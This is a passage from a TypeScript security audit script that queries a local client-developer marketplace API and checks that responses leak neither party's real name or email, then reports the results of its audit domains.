    if (clientLeaks > 0) {
      throw new Error(`Privacy leak detected: Developer received client real name or email in payload! Count: ${clientLeaks}`);
    }
    results.privacy.checks.push('✔ Client privacy: Developer payloads contain only anonymous Client tag (e.g. Client #101); zero PII leaked');

    // 10.2 Inspect proposal API payload returned to client
    const proposalInspectionResp = await fetch(`${baseUrl}/api/projects/${proj1Id}/proposals`, {
      headers: { Authorization: `Bearer ${client1Token}` },
    });
    const proposalsData = await proposalInspectionResp.json();
    const proposalPayloadStr = JSON.stringify(proposalsData);

    let developerLeaks = 0;
    // In pre-selection anonymous phase, developer real email/phone must not appear in candidate list
    if (proposalPayloadStr.includes(`d1.${suffix}@test.dev`)) developerLeaks++;
    if (developerLeaks > 0) {
      throw new Error(`Privacy leak detected: Client received developer private email in proposals payload! Count: ${developerLeaks}`);
    }
    results.privacy.checks.push('✔ Developer privacy: Candidate proposals contain anonymous identifiers; zero private emails leaked');
    results.privacy.passed = true;

    console.log('\n================================================================');
    console.log('ALL 10 DEFENSIVE SECURITY AUDIT DOMAINS VERIFIED SUCCESSFULLY');
    console.log('================================================================\n');

  } catch (error: any) {
    console.error('\n❌ SECURITY AUDIT FAILED:', error.message);
    throw error;
  } finally {
    if (server) {
      (server as Server).close();
    }
  }

  return results;
}

if (process.env.NODE_ENV !== 'production') {
  runSecurityAudit()
    .then((results) => {
      console.log('\nAudit Domain Summary:');
      for (const res of Object.values(results)) {
        console.log(`- [${res.passed ? 'PASS' : 'FAIL'}] ${res.domain}: ${res.checks.length} controls verified`);
      }
      process.exit(0);
    })
    .catch((err) => {
      console.error('Audit execution error:', err);
      process.exit(1);
    });
}
